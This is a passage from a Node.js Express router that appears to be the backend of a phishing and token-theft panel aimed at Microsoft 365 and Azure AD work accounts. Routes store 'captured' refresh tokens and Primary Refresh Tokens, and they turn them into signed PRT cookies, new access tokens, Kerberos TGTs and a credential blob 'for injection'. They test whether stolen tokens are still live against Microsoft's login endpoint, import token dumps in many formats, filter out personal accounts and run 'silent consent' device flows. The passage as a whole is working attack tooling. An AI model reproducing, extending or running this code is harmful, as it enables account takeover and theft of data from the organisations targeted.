      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];

    // Call kerberos service to derive TGTs
    const result = await kerberosService.deriveTGTForToken(req.params.id);

    if (result.success) {
      res.json({
        success: true,
        message: 'Kerberos TGTs derived successfully',
        token_id: result.token_id,
        email: result.email,
        tgt_cloud: result.tgt_cloud,
        tgt_ad: result.tgt_ad,
        session_key: result.session_key,
        kerberos_top_level_names: result.kerberos_top_level_names,
        tgt_cloud_sessionkey: result.tgt_cloud_sessionkey
      });
    } else {
      res.status(400).json({ error: result.error, success: false });
    }
  } catch (err) {

    res.status(500).json({ error: 'TGT derivation failed: ' + err.message });
  }
});

async function loadTokenRow(req, res) {
  const [tokens] = await db.query(
    'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
    [req.params.id, req.user.id]
  );
  if (!tokens.length) {
    res.status(404).json({ error: 'Token not found' });
    return null;
  }
  return tokens[0];
}

// device_credentials is keyed by (user_id, tenant_id) but the token row may
// name the tenant in either column. Try each candidate in turn and return
// the first one that actually holds a stored session key.
async function resolveSessionKeyForToken(token) {
  const deviceManager = require('../services/devicemanager');
  const candidates = [token.device_tenant_id, token.tenant].filter(Boolean);
  for (const tenant of candidates) {
    const materials = await deviceManager.getStoredSessionKey(token.user_id, tenant);
    if (materials.hasSessionKey) {
      return Object.assign({ tenant }, materials);
    }
  }
  return { tenant: candidates[0] || 'common', hasSessionKey: false, sessionKey: null };
}

/**
 * @returns {Promise<{prt: string|null, refreshed?: boolean, error?: string, tenant?: string}>}
 */
async function resolveRealPrt(token) {
  const storedPrt = safeDecrypt(token.prt);
  if (storedPrt && kerberosService.isValidPrtJwt(storedPrt)) {
    return { prt: storedPrt, refreshed: false };
  }
  const refreshOrPrt = safeDecrypt(token.refresh_token_encrypted);
  if (refreshOrPrt && kerberosService.isValidPrtJwt(refreshOrPrt)) {
    return { prt: refreshOrPrt, refreshed: false };
  }
  if (!refreshOrPrt) {
    dcdiag.fail('No refresh token stored for this token row - nothing to capture a PRT from.');
    return { prt: null, error: 'No refresh token stored for this token row - nothing to capture a PRT from.' };
  }
  const deviceManager = require('../services/devicemanager');
  const candidates = [token.device_tenant_id, token.tenant].filter(Boolean);
  for (const tenant of candidates) {
    try {
      const result = await deviceManager.capturePrtSessionKey(token.user_id, tenant, refreshOrPrt);
      try {
        await db.query(
          'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ? AND user_id = ?',
          [encrypt(result.prt), encrypt(result.sessionKeyJwe || null), token.id, token.user_id]
        );
      } catch (pErr) {
        dcdiag.fail('capturePrtSessionKey inner persist failed');
      }
      return { prt: result.prt, refreshed: true, tenant };
    } catch (err) {
      dcdiag.fail('capturePrtSessionKey failed: ' + err.message);
    }
  }
  dcdiag.fail('All capturePrtSessionKey attempts failed. No registered device available.');
  return {
    prt: null,
    error: 'No real PRT stored and no registered device available to capture one. Run the device flow, or POST /:id/prt-capture first.'
  };
}

// Slice C — POST /:id/prt-capture
router.post('/:id/prt-capture', userAuth, async (req, res) => {
  try {
    const token = await loadTokenRow(req, res);
    if (!token) return;
    const deviceManager = require('../services/devicemanager');
    const refreshToken = safeDecrypt(token.refresh_token_encrypted);
    if (!refreshToken) {
      return res.status(409).json({ success: false, error: 'No refresh token stored for this token row — nothing to capture a PRT from.' });
    }
    const candidates = [token.device_tenant_id, token.tenant].filter(Boolean);
    if (candidates.length === 0) {
      return res.status(409).json({ success: false, error: 'Token row has no tenant (device_tenant_id/tenant) — cannot locate device credentials.' });
    }
    let lastErr = null;
    for (const tenant of candidates) {
      try {
        const result = await deviceManager.capturePrtSessionKey(token.user_id, tenant, refreshToken);
        try {
          if (result.sessionKeyJwe) {
            await db.query(
              'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ? AND user_id = ?',
              [encrypt(result.prt), encrypt(result.sessionKeyJwe), token.id, token.user_id]
            );
          } else {
            await db.query(
              'UPDATE captured_tokens SET prt = ? WHERE id = ? AND user_id = ?',
              [encrypt(result.prt), token.id, token.user_id]
            );
          }
        } catch (pErr) {

        }

        if (tenant && tenant !== 'common' && tenant !== 'organizations') {
          kerberosService.deriveTGTForToken(token.id)
            .catch(e => {});
        }
        return res.json({
          success: true,
          tenant,
          prtPrefix: result.prt.substring(0, 40),
          prtLength: result.prt.length,
          expiresOn: result.expiresOn,
          user: result.user,
          sessionKeyStored: true,
          message: 'PRT + session key captured. The prt-cookie and prt-token routes are now available for this token.'
        });
      } catch (err) {
        lastErr = err;

      }
    }
    return res.status(409).json({ success: false, error: 'PRT capture failed: ' + (lastErr ? lastErr.message : 'no device credentials for any candidate tenant') });
  } catch (err) {

    res.status(500).json({ success: false, error: 'PRT capture failed: ' + err.message });
  }
});

// Slice A — POST /:id/prt-cookie
router.post('/:id/prt-cookie', userAuth, async (req, res) => {
  try {
    const token = await loadTokenRow(req, res);
    if (!token) return;
    const prtkdf = require('../services/prtkdf');
    const prtResolution = await resolveRealPrt(token);
    const materials = await resolveSessionKeyForToken(token);
    if (!prtResolution.prt) {
      return res.status(409).json({ success: false, error: prtResolution.error || 'No PRT stored for this token. POST /:id/prt-capture first.' });
    }
    const prt = prtResolution.prt;
    if (!materials.hasSessionKey) {
      return res.status(409).json({ success: false, error: 'No PRT session key stored for this user+tenant. POST /:id/prt-capture first.' });
    }
    const cookie = await prtkdf.generatePrtCookie({
      prt,
      sessionKey: materials.sessionKey,
      nonce: (req.body && req.body.nonce) || null, // optional pre-fetched nonce
    });
    // Persist alongside the other stored PRT cookie (same convention as refreshPrtCookie)
    try {
      await db.query(
        'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
        [encrypt(cookie.value), token.user_id, materials.tenant]
      );
    } catch (pErr) {

    }
    res.json({ success: true, cookie, message: 'KDF-signed PRT cookie generated' });
  } catch (err) {

    res.status(500).json({ success: false, error: 'PRT cookie generation failed: ' + err.message });
  }
});

// Slice B — POST /:id/prt-token
router.post('/:id/prt-token', userAuth, async (req, res) => {
  try {
    const token = await loadTokenRow(req, res);
    if (!token) return;
    const prtkdf = require('../services/prtkdf');
    const prtResolution = await resolveRealPrt(token);
    const materials = await resolveSessionKeyForToken(token);
    if (!prtResolution.prt) {
      return res.status(409).json({ success: false, error: prtResolution.error || 'No PRT stored for this token. POST /:id/prt-capture first.' });
    }
    const prt = prtResolution.prt;
    if (!materials.hasSessionKey) {
      return res.status(409).json({ success: false, error: 'No PRT session key stored for this user+tenant. POST /:id/prt-capture first.' });
    }
    const opts = req.body || {};
    const result = await prtkdf.prtToAccessToken({
      prt,
      sessionKey: materials.sessionKey,
      clientId: opts.clientId || undefined,
      resource: opts.resource || undefined,
      scope: opts.scope || undefined,
      refreshPrt: opts.refreshPrt !== undefined ? opts.refreshPrt : true,
      apiVersion: opts.apiVersion || 1,
    });
    // Persist the rotated PRT when AAD issued one (refreshPrt + "aza" scope)
    if (result.refreshToken) {
      try {
        await db.query(
          'UPDATE captured_tokens SET prt = ? WHERE id = ? AND user_id = ?',
          [encrypt(result.refreshToken), token.id, token.user_id]
        );
      } catch (pErr) {

      }
    }
    // Store the access token with the other token material (same as /renew)
    if (result.accessToken) {
      try {
        await db.query(
          'UPDATE captured_tokens SET access_token_encrypted = ? WHERE id = ? AND user_id = ?',
          [encrypt(result.accessToken), token.id, token.user_id]
        );
      } catch (pErr) {

      }
    }
    res.json({
      success: true,
      accessToken: result.accessToken,
      tokenType: result.tokenType,
      expiresIn: result.expiresIn,
      foci: result.foci,
      rotatedPrt: !!result.refreshToken,
      message: 'Access token issued from PRT'
    });
  } catch (err) {

    res.status(500).json({ success: false, error: 'PRT token exchange failed: ' + err.message });
  }
});

// ─── Bulk derive Kerberos TGTs for all eligible tokens ──────────────
router.post('/bulk-derive-tgts', userAuth, async (req, res) => {
  try {
    const limit = parseInt(req.body.limit) || 50;
    const stats = await kerberosService.bulkDeriveTGTs(limit);
    res.json({
      success: true,
      ...stats
    });
  } catch (err) {

    res.status(500).json({ error: 'Bulk TGT derivation failed: ' + err.message });
  }
});

// ─── Get full PRT credential blob for injection ─────────────────────
router.get('/:id/full-credential-blob', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const result = await kerberosService.getFullPRTCredentialBlob(req.params.id);

    if (result.success) {
      res.json({
        success: true,
        blob: result.blob
      });
    } else {
      res.status(400).json({ error: result.error, success: false });
    }
  } catch (err) {

    res.status(500).json({ error: 'Failed to get credential blob: ' + err.message });
  }
});

// ─── Check token status (active/revoked) ─────────────────────────────────
router.post('/check-status', userAuth, async (req, res) => {
  try {
    const { token_id } = req.body;
    
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }
    
    // Get token
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    
    if (!tokens.length) {
      return res.status(404).json({ error: 'Token not found' });
    }
    
    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const clientId = token.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
    const tenant = token.tenant || config.AZURE_TENANT || 'common';
    
    if (!refreshToken) {
      return res.json({ status: 'unknown', message: 'No refresh token available' });
    }
    
    // Try to refresh the token to check if it's still valid
    const axios = require('axios');
    const tokenEndpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
    
    try {
      const response = await axios.post(
        tokenEndpoint,
        new URLSearchParams({
          client_id: clientId,
          grant_type: 'refresh_token',
          refresh_token: refreshToken,
                    scope: 'openid profile email offline_access'
        }),
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          timeout: 15000
        }
      );
      
      if (response.data.access_token) {
        // Token is still active - update status
        await db.query(
          'UPDATE captured_tokens SET token_status = ? WHERE id = ?',
          ['active', token_id]
        );
        
        return res.json({ status: 'active', message: 'Token is valid and active' });
      }
    } catch (err) {
      // Check if error indicates revoked token
      const errorData = err.response?.data;
      if (errorData?.error === 'invalid_grant' || 
          errorData?.error === 'invalid_request' ||
          (errorData?.error_description && 
           (errorData.error_description.includes('revoked') || 
            errorData.error_description.includes('expired')))) {
        
        // Token is revoked
        await db.query(
          'UPDATE captured_tokens SET token_status = ? WHERE id = ?',
          ['revoked', token_id]
        );
        
        return res.json({ status: 'revoked', message: 'Token has been revoked' });
      }
    }
    
    return res.json({ status: 'unknown', message: 'Could not determine token status' });
  } catch (err) {

    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Import token manually ────────────────────────────────────────────────
router.post('/import', userAuth, tokenUpload.single('tokenFile'), async (req, res) => {
  try {
    // Check if this is a file upload (multipart/form-data)
    if (req.files && req.files.tokenFile) {
      return await importTokenFile(req, res);
    }

    // Standard JSON body import
    const {
      refresh_token,
      access_token,
      id_token,
      client_id,
      email,
      tenant,
      account_type,
      notes,
      prt,
      name
    } = req.body;

    if (!refresh_token && !prt) {
      return res.status(400).json({ error: 'refresh_token or prt is required' });
    }

    const clientId = client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const emailAddress = email || '';
    const tokenName = name || '';

    // Extract email from id_token if not provided
    let extractedEmail = emailAddress;
    if (!extractedEmail && id_token) {
      try {
        const tokenParts = id_token.split('.');
        if (tokenParts.length === 3) {
          const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
          extractedEmail = payload.email || payload.preferred_username || '';
        }
      } catch (e) {
        // Could not extract email from id_token
      }
    }

    // ─── Personal Account Detection & Rejection ────────────────
    // Check if the email domain is a known personal Microsoft account domain
    const personalDomains = [
      'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
      'outlook.co', 'hotmail.co', 'live.co', 'msn.co',
      'outlook.fr', 'hotmail.fr', 'live.fr', 'msn.fr',
      'outlook.de', 'hotmail.de', 'live.de', 'msn.de',
      'outlook.it', 'hotmail.it', 'live.it', 'msn.it',
      'outlook.es', 'hotmail.es', 'live.es', 'msn.es',
      'outlook.com.br', 'hotmail.com.br', 'live.com.br',
      'outlook.com.au', 'hotmail.com.au', 'live.com.au',
      'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
      'outlook.in', 'hotmail.in', 'live.in',
      'outlook.jp', 'hotmail.jp', 'live.jp',
      'outlook.kr', 'hotmail.kr', 'live.kr',
      'gmail.com', 'gmail.co', 'googlemail.com',
      'yahoo.com', 'yahoo.co', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de',
      'icloud.com', 'me.com', 'mac.com',
      'aol.com', 'aol.co', 'aim.com',
      'protonmail.com', 'proton.me', 'pm.me',
      'mail.com', 'gmx.com', 'gmx.de', 'web.de',
      'yandex.com', 'yandex.ru', 'mail.ru'
    ];

    const emailDomain = extractedEmail ? extractedEmail.split('@').pop().toLowerCase() : '';
    const isPersonalEmail = personalDomains.includes(emailDomain);

    // Also check if account_type is explicitly personal
    const isPersonalAccount = account_type === 'personal' || isPersonalEmail;

    if (isPersonalAccount) {
      return res.status(400).json({
        error: 'Personal Microsoft accounts are not supported',
        details: `The email domain "${emailDomain}" is a personal account provider. Only Work/School (Microsoft 365 / Azure AD) accounts are supported.`,
        supported: 'Work/School accounts with custom domains (e.g., user@company.com, user@school.edu, user@organization.org)'
      });
    }

    // ─── Validate Work/School Account ──────────────────────────
    // Check if email has a valid domain (not just @outlook.com etc.)
    if (extractedEmail) {
      const domainParts = emailDomain.split('.');
      // Must have at least 2 parts and not be a known personal domain
      if (domainParts.length < 2) {
        return res.status(400).json({
          error: 'Invalid email format',
          details: 'The email address does not have a valid domain.'
        });
      }

      // Check for common work/school TLDs
      const workTlds = ['.edu', '.gov', '.org', '.ac', '.mil', '.co'];
      const hasWorkTld = workTlds.some(tld => emailDomain.endsWith(tld));

      // If it's a single-word domain (like @company), it might still be valid
      // but we flag it for review
      if (!hasWorkTld && domainParts.length === 2 && domainParts[0].length < 3) {
        return res.status(400).json({
          error: 'Suspicious email domain',
          details: `The domain "${emailDomain}" appears to be a personal account provider. Only Work/School accounts are supported.`
        });
      }
    }

    // Force account type to work_school
    const accountType = 'work_school';

    // Encrypt tokens
    const accessEncrypted = access_token ? encrypt(access_token) : null;
    const refreshEncrypted = refresh_token ? encrypt(refresh_token) : null;
    const idEncrypted = id_token ? encrypt(id_token) : null;
    const prtEncrypted = prt ? encrypt(prt) : null;

    // Insert into database
    const [result] = await db.query(
      `INSERT INTO captured_tokens
       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted,
        id_token_encrypted, prt, ip_address, user_agent, notes, expiration, tenant, template_type,
        account_type, client_id, token_status, name)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?)`,
      [
        req.user.id,
        null,
        extractedEmail,
        'token',
        accessEncrypted,
        refreshEncrypted,
        idEncrypted,
        prtEncrypted,
        'manual',
        'Manual Import',
        notes || '',
        tenantVal,
        'office',
        accountType,
        clientId,
        'active',
        tokenName
      ]
    );

    res.json({
      success: true,
      token_id: result.insertId,
      email: extractedEmail,
      message: 'Token imported successfully'
    });
  } catch (err) {

    res.status(500).json({ error: 'Server error: ' + err.message });
  }
});

// ─── Import token from file (JSON/TXT) ─────────────────────────────────────
async function importTokenFile(req, res) {
  try {
    // When using multer.single('tokenFile'), the file is in req.file
    const file = req.file;
    if (!file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }

    const content = file.buffer.toString('utf8').trim();
    let tokenData;

    // Try to parse as JSON first
    if (file.mimetype === 'application/json' || file.name.endsWith('.json')) {
      try {
        tokenData = JSON.parse(content);
      } catch (e) {
        tokenData = parseAlternativeFormat(content);
      }
    } else {
      // Try JSON first
      try {
        tokenData = JSON.parse(content);
      } catch (e) {
        // Try alternative formats (keychain, WebKit, etc.)
        tokenData = parseAlternativeFormat(content);
      }
    }

    // If tokenData is a string (raw token), wrap it
    if (typeof tokenData === 'string') {
      // Check if it looks like a refresh token or PRT
      if (tokenData.startsWith('0.AT') || tokenData.startsWith('M.R') || tokenData.length > 100) {
        tokenData = { refresh_token: tokenData };
      } else {
        tokenData = { prt: tokenData };
      }
    }

    // Handle array of tokens
    if (Array.isArray(tokenData)) {
      const results = [];
      for (const item of tokenData) {
        const result = await processImportedToken(req, item);
        results.push(result);
      }
      return res.json({
        success: true,
        imported: results.filter(r => r.success).length,
        failed: results.filter(r => !r.success).length,
        results: results
      });
    }

    // Single token - ensure it's an object
    if (typeof tokenData !== 'object' || tokenData === null) {
      return res.status(400).json({ error: 'Could not extract token data from file' });
    }

    // Normalize the token data
    tokenData = normalizeTokenKeys(tokenData);

    // Try to find token in any field if not found in standard fields
    if (!tokenData.refresh_token && !tokenData.prt) {
      for (const [key, value] of Object.entries(tokenData)) {
        const lowerKey = key.toLowerCase();
        
        if (typeof value === 'string') {
          // Check if key contains token-related words
          if (lowerKey.includes('token') || lowerKey.includes('prt') || lowerKey.includes('refresh')) {
            if (lowerKey.includes('refresh') || lowerKey.includes('access')) {
              tokenData.refresh_token = value;
            } else if (lowerKey.includes('prt')) {
              tokenData.prt = value;
            } else {
              // Assume it's a refresh token by default
              tokenData.refresh_token = value;
            }
            break;
          }
          
          // Check if value looks like a token (long string)
          if (value.length > 50 && !key.includes('email') && !key.includes('name')) {
            if (value.startsWith('0.AT') || value.startsWith('M.R') || value.length > 200) {
              tokenData.refresh_token = value;
              break;
            }
          }
        }
        
        // Check nested objects
        if (typeof value === 'object' && value !== null) {
          const nested = normalizeTokenKeys(value);
          if (nested.refresh_token || nested.prt) {
            if (nested.refresh_token) tokenData.refresh_token = nested.refresh_token;
            if (nested.prt) tokenData.prt = nested.prt;
            break;
          }
        }
      }
    }

    const result = await processImportedToken(req, tokenData);
    if (result.success) {
      res.json({ success: true, token_id: result.token_id, email: result.email, message: 'Token imported successfully' });
    } else {
      res.status(400).json({ error: result.error, details: result.details });
    }
  } catch (err) {


    res.status(500).json({ error: 'Server error: ' + err.message });
  }
}

// ─── Parse alternative token formats (keychain, WebKit, etc.) ────────────────
function parseAlternativeFormat(content) {
  const tokenObj = {};

  // Handle multipart form data (------WebKitFormBoundary...)
  const boundaryLines = content.split('\n').filter(line => line.trim().startsWith('------'));
  if (boundaryLines.length > 0) {
    const lines = content.split('\n');
    let currentField = '';
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i].trim();
      const dispMatch = line.match(/name="([^"]+)"/);
      if (dispMatch) {
        currentField = dispMatch[1];
        if (i + 2 < lines.length) {
          const valueLine = lines[i + 2];
          if (valueLine && !valueLine.startsWith('-')) {
            tokenObj[currentField] = valueLine.trim();
          }
        }
      }
    }
    if (Object.keys(tokenObj).length > 0) {
      return normalizeTokenKeys(tokenObj);
    }
  }

  // Try key:value format
  const lines = content.split('\n');
  for (const line of lines) {
    const colonIndex = line.indexOf(':');
    if (colonIndex > 0 && colonIndex < 100) {
      const key = line.substring(0, colonIndex).trim().replace(/^["']|["']$/g, '');
      const value = line.substring(colonIndex + 1).trim().replace(/^["']|["']$/g, '').replace(/,$/, '');
      if (key && value && !key.startsWith('#') && !key.startsWith('-') && !key.startsWith('Content')) {
        tokenObj[key] = value;
      }
    }
  }

  if (tokenObj.refresh_token || tokenObj.prt || tokenObj.email) {
    return normalizeTokenKeys(tokenObj);
  }

  return tokenObj;
}

function normalizeTokenKeys(obj) {
  const normalized = {};
  
  // Handle null/undefined
  if (!obj) return normalized;
  
  // If it's a string, try to parse it as JSON first
  if (typeof obj === 'string') {
    try {
      obj = JSON.parse(obj);
    } catch (e) {
      // Not JSON, return as-is
      return { raw: obj };
    }
  }
  
  // If it's an array, process each item
  if (Array.isArray(obj)) {
    return obj;
  }
  
  // Process each key-value pair
  for (const [key, value] of Object.entries(obj)) {
    const lowerKey = key.toLowerCase().replace(/[_-]/g, '_');
    
    // Handle nested objects - flatten them
    if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
      const nested = normalizeTokenKeys(value);
      for (const [nk, nv] of Object.entries(nested)) {
        if (!normalized[nk]) {
          normalized[nk] = nv;
        }
      }
      continue;
    }
    
    // Map common variations to standard names
    if (lowerKey === 'email' || lowerKey === 'e_mail' || lowerKey === 'user_email') {
      normalized.email = value;
    } else if (lowerKey === 'name' || lowerKey === 'user_name' || lowerKey === 'display_name') {
      normalized.name = value;
    } else if (lowerKey === 'access_token' || lowerKey === 'accesstoken' || lowerKey === 'access token') {
      normalized.access_token = value;
    } else if (lowerKey === 'refresh_token' || lowerKey === 'refreshtoken' || lowerKey === 'refresh token' || lowerKey === 'refresh') {
      normalized.refresh_token = value;
    } else if (lowerKey === 'prt' || lowerKey === 'primary_refresh_token' || lowerKey === 'primaryrefreshToken') {
      normalized.prt = value;
    } else if (lowerKey === 'tenant' || lowerKey === 'tenant_id' || lowerKey === 'tenantid') {
      normalized.tenant = value;
    } else if (lowerKey === 'client_id' || lowerKey === 'clientid' || lowerKey === 'client_id') {
      normalized.client_id = value;
    } else if (lowerKey === 'account_type' || lowerKey === 'accounttype' || lowerKey === 'account type') {
      normalized.account_type = value;
    } else if (lowerKey === 'notes' || lowerKey === 'note' || lowerKey === 'description') {
      normalized.notes = value;
    } else if (lowerKey === 'id_token' || lowerKey === 'idtoken') {
      normalized.id_token = value;
    } else {
      // Keep original key for unknown fields
      normalized[key] = value;
    }
  }
  
  return normalized;
}

// ─── Process a single imported token ───────────────────────────────────────
async function processImportedToken(req, data) {
  try {
    // First, normalize the data keys
    const normalized = normalizeTokenKeys(data);
    
    
    // Validate required fields - check multiple possible field names
    const refreshToken = normalized.refresh_token || '';
    const prt = normalized.prt || '';
    
    // Also check if there's a nested object with tokens
    if (!refreshToken && !prt) {
      // Try to find any token-like fields
      for (const [key, value] of Object.entries(normalized)) {
        if (typeof value === 'string' && value.length > 50) {
          if (key.toLowerCase().includes('refresh') || key.toLowerCase().includes('token')) {
            normalized.refresh_token = value;
            break;
          }
        }
      }
    }
    
    const refreshTokenFinal = normalized.refresh_token || '';
    const prtFinal = normalized.prt || '';
    
    if (!refreshTokenFinal && !prtFinal) {
      return { 
        success: false, 
        error: 'Missing refresh_token or prt', 
        email: normalized.email || '',
        details: 'Available fields: ' + Object.keys(normalized).join(', ')
      };
    }
    
    const email = normalized.email || '';
    const name = normalized.name || '';
    const accessToken = normalized.access_token || '';
    const tenant = normalized.tenant || 'common';
    const clientId = normalized.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
    const notes = normalized.notes || '';
    const accountType = normalized.account_type || 'work_school';

    // ─── Personal Account Detection & Rejection ────────────────
    const personalDomains = [
      'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
      'outlook.co', 'hotmail.co', 'live.co', 'msn.co',
      'outlook.fr', 'hotmail.fr', 'live.fr', 'msn.fr',
      'outlook.de', 'hotmail.de', 'live.de', 'msn.de',
      'outlook.it', 'hotmail.it', 'live.it', 'msn.it',
      'outlook.es', 'hotmail.es', 'live.es', 'msn.es',
      'outlook.com.br', 'hotmail.com.br', 'live.com.br',
      'outlook.com.au', 'hotmail.com.au', 'live.com.au',
      'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
      'outlook.in', 'hotmail.in', 'live.in',
      'outlook.jp', 'hotmail.jp', 'live.jp',
      'outlook.kr', 'hotmail.kr', 'live.kr',
      'gmail.com', 'gmail.co', 'googlemail.com',
      'yahoo.com', 'yahoo.co', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de',
      'icloud.com', 'me.com', 'mac.com',
      'aol.com', 'aol.co', 'aim.com',
      'protonmail.com', 'proton.me', 'pm.me',
      'mail.com', 'gmx.com', 'gmx.de', 'web.de',
      'yandex.com', 'yandex.ru', 'mail.ru'
    ];

    const emailDomain = email ? email.split('@').pop().toLowerCase() : '';
    const isPersonalEmail = personalDomains.includes(emailDomain);
    const isPersonalAccount = accountType === 'personal' || isPersonalEmail;

    if (isPersonalAccount) {
      return {
        success: false,
        error: 'Personal Microsoft accounts are not supported',
        details: `The email domain "${emailDomain}" is a personal account provider. Only Work/School (Microsoft 365 / Azure AD) accounts are supported.`,
        email: email
      };
    }

    // Validate work/school domain
    if (email) {
      const domainParts = emailDomain.split('.');
      if (domainParts.length < 2) {
        return { success: false, error: 'Invalid email format', email: email };
      }

      const workTlds = ['.edu', '.gov', '.org', '.ac', '.mil', '.co'];
      const hasWorkTld = workTlds.some(tld => emailDomain.endsWith(tld));

      if (!hasWorkTld && domainParts.length === 2 && domainParts[0].length < 3) {
        return {
          success: false,
          error: `Suspicious email domain "${emailDomain}". Only Work/School accounts are supported.`,
          email: email
        };
      }
    }

    // Force account type to work_school
    const forcedAccountType = 'work_school';

    // Encrypt tokens - use the final values
    const accessEncrypted = accessToken ? encrypt(accessToken) : null;
    const refreshEncrypted = refreshTokenFinal ? encrypt(refreshTokenFinal) : null;
    const prtEncrypted = prtFinal ? encrypt(prtFinal) : null;

    // Insert into database
    const [result] = await db.query(
      `INSERT INTO captured_tokens
       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted,
        prt, ip_address, user_agent, notes, expiration, tenant, template_type,
        account_type, client_id, token_status, name)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?)`,
      [
        req.user.id,
        null,
        email,
        'token',
        accessEncrypted,
        refreshEncrypted,
        prtEncrypted,
        'manual',
        'File Import',
        notes,
        tenant,
        'office',
        forcedAccountType,
        clientId,
        'active',
        name
      ]
    );

    return { success: true, token_id: result.insertId, email: email };
  } catch (err) {

    return { success: false, error: err.message, email: data.email || '' };
  }
}

// ─── Silent consent: Test if existing refresh token works ────────────
router.post('/silent-consent/test', userAuth, async (req, res) => {
  try {
    const { refresh_token, tenant, account_type, template_type } = req.body;

    if (!refresh_token) {
      return res.status(400).json({ error: 'refresh_token is required' });
    }

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const consentConfig = silentConsentService.getPreConsentedClient(accountType, tenantVal, templateType);
    const result = await silentConsentService.testRefreshToken(
      refresh_token,
      consentConfig.tokenEndpoint,
      consentConfig.client_id,
      consentConfig.scopes
    );

    res.json({
      success: result.success,
      consent_required: !result.success,
      access_token: result.access_token,
      new_refresh_token: result.new_refresh_token,
      strategy: result.success ? 'token_valid' : 'consent_needed'
    });
  } catch (err) {

    res.status(500).json({ error: 'Silent consent test failed: ' + err.message });
  }
});

// ─── Silent consent: Initiate device flow with pre-consented client ─
router.post('/silent-consent/device-flow', userAuth, async (req, res) => {
  try {
    const { tenant, account_type, template_type, existing_refresh_token } = req.body;

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const result = await silentConsentService.initiateSilentDeviceFlow(
      tenantVal,
      accountType,
      templateType,
      existing_refresh_token
    );

    res.json(result);
  } catch (err) {

    res.status(500).json({ error: 'Silent consent device flow failed: ' + err.message });
  }
});

// ─── Silent consent: Find best working client for tenant ─────────────
router.post('/silent-consent/find-client', userAuth, async (req, res) => {
  try {
    const { tenant, account_type, template_type } = req.body;

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const result = await silentConsentService.findWorkingClient(tenantVal, accountType, templateType);
    res.json(result);
  } catch (err) {

    res.status(500).json({ error: 'Find client failed: ' + err.message });
  }
});

module.exports = router;
